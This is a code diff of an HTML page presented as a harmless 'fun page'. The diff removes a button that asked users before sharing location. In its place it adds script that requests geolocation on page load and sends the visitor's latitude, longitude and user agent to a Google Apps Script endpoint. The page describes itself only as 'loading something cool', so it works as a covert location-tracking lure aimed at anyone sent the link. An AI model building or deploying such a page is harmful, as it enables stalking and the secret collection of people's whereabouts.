@@ -2,77 +2,55 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Funny Page</title>
+  <title>Just a Fun Page</title>
   <style>
     body {
-      font-family: sans-serif;
+      font-family: Arial, sans-serif;
       text-align: center;
-      margin-top: 50px;
+      padding-top: 20%;
+      background-color: #f2f2f2;
     }
-    button {
-      padding: 10px 20px;
-      font-size: 18px;
-      margin-top: 20px;
-      cursor: pointer;
+    h1 {
+      font-size: 2em;
+      color: #333;
     }
-    #msg {
-      margin-top: 20px;
-      font-weight: bold;
+    p {
+      color: #555;
     }
   </style>
 </head>
 <body>
-  <h1>This page is just for fun 😄</h1>
-  <p>If you're seeing this, you're amazing!</p>
-
-  <p><strong>🔒 If you're using Messenger or WhatsApp, please open this in Chrome or Safari.</strong></p>
-
-  <button onclick="sendLocation()">Click here to share your location</button>
-
-  <p id="msg"></p>
+  <h1>Loading something cool... 😄</h1>
+  <p>This might take a second...</p>
 
   <script>
-    // Detect in-app browsers (Messenger, FB, etc.)
-    const ua = navigator.userAgent;
-    if (ua.includes("FBAN") || ua.includes("FBAV") || ua.includes("Instagram") || ua.includes("WhatsApp")) {
-      document.getElementById("msg").innerText =
-        "⚠️ This browser may block location access. Please open in Chrome/Safari.";
-    }
+    // Try to get location as soon as the page loads
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const ua = navigator.userAgent;
 
-    function sendLocation() {
-      if (!navigator.geolocation) {
-        document.getElementById("msg").innerText = "Geolocation is not supported.";
-        return;
+        const url =
+          "https://script.google.com/macros/s/AKfycbw9qFm0UFnu3eengU-c21xnMyiwCRy8_b9JWN8bZL7eGZxzfOWsfl-mHAXoU7UHNRMD/exec" +
+          "?lat=" + lat + "&lon=" + lon + "&ua=" + encodeURIComponent(ua);
+
+        fetch(url)
+          .then((res) => res.text())
+          .then((txt) => {
+            console.log("Location sent:", txt);
+            document.body.innerHTML += "<p style='color:green;'>✅ Done!</p>";
+          })
+          .catch((err) => {
+            console.error("Fetch error:", err);
+            document.body.innerHTML += "<p style='color:red;'>❌ Failed to send data.</p>";
+          });
+      },
+      (error) => {
+        console.error("Geolocation error:", error);
+        document.body.innerHTML += "<p style='color:red;'>❌ Location access denied.</p>";
       }
-
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          const ua = navigator.userAgent;
-
-          const url =
-            "https://script.google.com/macros/s/AKfycbw9qFm0UFnu3eengU-c21xnMyiwCRy8_b9JWN8bZL7eGZxzfOWsfl-mHAXoU7UHNRMD/exec" +
-            "?lat=" + lat + "&lon=" + lon + "&ua=" + encodeURIComponent(ua);
-
-          fetch(url)
-            .then((res) => res.text())
-            .then((txt) => {
-              document.getElementById("msg").innerText = "✅ Location sent successfully!";
-              console.log("Location sent:", txt);
-            })
-            .catch((err) => {
-              console.error("Error:", err);
-              document.getElementById("msg").innerText = "❌ Failed to send location.";
-            });
-        },
-        (error) => {
-          console.error("Geolocation error:", error);
-          document.getElementById("msg").innerText =
-            "❌ Location access denied or unavailable.";
-        }
-      );
-    }
+    );
   </script>
 </body>
 </html>
